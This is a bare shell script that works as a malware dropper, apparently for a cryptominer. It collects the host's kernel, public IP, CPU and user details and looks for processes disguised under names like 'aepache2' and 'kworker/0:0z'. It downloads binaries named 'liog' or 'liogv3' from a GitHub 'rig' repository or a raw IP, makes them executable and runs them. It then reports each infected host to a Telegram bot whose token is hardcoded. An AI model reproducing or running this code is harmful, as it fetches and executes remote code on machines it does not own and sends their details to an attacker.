kr=$(uname -r)
z=$(wget ifconfig.me -q -O - )
arc=$(getconf LONG_BIT)
p=$(nproc)
me=$(whoami)
dir=$(pwd)
e=$(ps x|grep aepache2|grep -v grep|awk '{print $1}'|wc -l)
l=$(ps x|grep liog|grep -v grep|awk '{print $1}'|wc -l)
k=$(ps x|grep kworker/0:0z|grep -v grep|awk '{print $1}'|wc -l)
id=$(ps x|grep liog|grep -v grep|awk '{print $1}')
fe='https://github.com/zoalsharf/rig/raw/master/m6'
f3='https://github.com/zoalsharf/rig/raw/master/m3'
m='http://192.99.226.65/m'
function de() {
        /bin/rm -rf /tmp/liog
        if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
                wget --no-check-certificate -c $1 -O $2 && chmod 777 $2
        elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
                curl -fs $1 -o $2 && chmod 777 $2
        elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
                wge -c $1 -O $2 && chmod 777 $2
        elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
                get -c $1 -O $2 && chmod 777 $2
        elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
                cur -fs $1 -o $2 && chmod 777 $2
        elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
                url -fs $1 -o $2 && chmod 777 $2
        else
                rpm -e --nodeps wget
                yum -y install wget
                apt install -y wget
                wget --no-check-certificate -c $1 -O $2 && chmod 777 
$2
        fi
}

function hash() {
        if [ "$l" == "1" ] || [ "$k" == "1" ] || [ "$id" == "1" ] || [ "$e" ==  "1" ]; then
                di=$(ps x|grep liog|grep -v grep|awk '{print $1}')
                dir=$(pwdx $di|awk '{print $2}')
                d=$dir"/""liog"
                if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
                        sum=$(md5sum $d|grep e110622f88718718664afc6873c61587|grep -v grep |wc -l)
                        if [ $sum -eq 1 ]; then
                                wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                                exit 0
                        else
#                                cd /tmp
                                rm liog
#                                cd /tmp && de $m 'm'
                                de $fe 'liog'
                                chomd 777 liog && ./liog
#                                cd /tmp && rm m liog
                                wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                        fi
                else
                        echo 'no sum'
                fi
        else
                echo 'de1'
                rm liog
                de $fe 'liog'
                chmod 777 liog && ./liog
#                cd /tmp && rm m liog
                if [  "$me" == "root" ]; then
                        wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                else
                        wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                        exit 0
                fi
        fi
}

function hash32() {
        if [ "$l" == "1" ] || [ "$k" == "1" ] || [ "$id" == "1" ] || [ "$e" ==  "1" ]; then
                di=$(ps x|grep liog|grep -v grep|awk '{print $1}')
                dir=$(pwdx $di|awk '{print $2}')
                d=$dir"/""liogv3"
                if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
                        sum=$(md5sum $d|grep e110622f88718718664afc6873c61587|grep -v grep |wc -l)
                        if [ $sum -eq 1 ]; then
                                wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                                exit 0
                        else
 #                               cd /tmp
                                rm liogv3
                                de $f3 'liogv3'
                                chmod 777 liogv3 && ./liogv3
#                                cd /tmp && rm liog
                                wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                        fi
                else
                        echo 'no sum'
                fi
        else
                echo 'de1'
#		rm /tmp/liogv3
                de $f3 'liogv3'
                chmod 777 liogv3 && ./liogv3
#               cd /tmp && rm liogv3
                if [  "$me" == "root" ]; then
                        wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -                                                                     else
                        wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                        exit 0
                fi
        fi
}


function run () {
	if [ $arc = 64 ]; then
		hash
	else
		hash32
	fi
}

run
